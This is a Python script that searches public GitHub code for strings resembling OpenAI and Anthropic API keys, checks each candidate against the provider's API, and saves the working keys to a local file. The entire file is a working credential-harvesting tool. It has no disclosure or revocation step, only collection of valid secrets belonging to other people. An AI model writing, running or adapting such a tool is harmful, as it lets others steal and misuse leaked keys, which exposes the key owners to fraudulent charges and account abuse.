import argparse
import os
import re

import openai
import requests
from dotenv import load_dotenv
from github import Auth, Github


def try_anthropic(match):
    print("Trying anthropic")
    url = "https://api.anthropic.com/v1/complete"
    headers = {
        "x-api-key": match,
        "Content-Type": "application/json",
    }
    data = {
        "model": "claude-2",
        "prompt": "Hello",
        "max_tokens_to_sample": 20,
    }
    response = requests.post(url, headers=headers, json=data)
    if response.status_code == 200:
        return 1
    return 0


def try_openai(match):
    openai.api_key = match
    try:
        openai.models.list()
        return 1
    except openai.AuthenticationError:
        return 0


def make_search(max_tries: int, service: str, git: Github, output_file: str):
    searches = {
        "openai": {
            "query": "sk- in:file",
            "pattern": r"sk-\w{40,}\b",
            "fn": try_openai,
        },
        "anthropic": {
            "query": "api- in:file",
            "pattern": r"api-\w{40,}\b",
            "fn": try_anthropic,
        },
    }
    info = searches[service]
    print(
        f"Beginning {service} search with {max_tries} max results, successes stored in: {output_file}"
    )

    with open(output_file, "w") as output:
        count = 0
        print(f"Searching for: {info['query']}")
        results = git.search_code(info["query"], order="desc")
        for file in results:
            try:
                content = file.decoded_content.decode()
                matches = re.compile(info["pattern"]).findall(content)
                if matches:
                    for match in matches:
                        try:
                            print(f"{service}: trying {match}")
                            if info["fn"](match):
                                output.write(f"{match}\n")
                                print(
                                    f"{service} key found in {file.repository.full_name}/{file.path}"
                                )
                            else:
                                print(f"{service} authentication error")
                        except Exception as e:
                            pass
                    count += 1
                    if count >= max_tries:
                        break
            except Exception as e:
                print(f"Error reading {file.path}: {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Search GitHub repos for API keys and test them."
    )
    parser.add_argument(
        "-n",
        "--tries",
        type=int,
        default=50,
        help="Maximum number of key attempts to perform (default: 50).",
    )
    parser.add_argument(
        "-s",
        "--service",
        choices=["openai", "anthropic"],
        default="openai",
        help="Which service keys to test: openai or anthropic (default: openai).",
    )
    args = parser.parse_args()
    output_file = "keys.txt"

    load_dotenv()
    github_key = os.getenv("GITHUB_KEY")
    if not github_key:
        raise RuntimeError("GITHUB_KEY not found in environment.")
    auth = Auth.Token(github_key)
    git = Github(auth=auth)

    try:
        make_search(
            max_tries=args.tries, service=args.service, git=git, output_file=output_file
        )
    except KeyboardInterrupt:
        print("\nExiting")
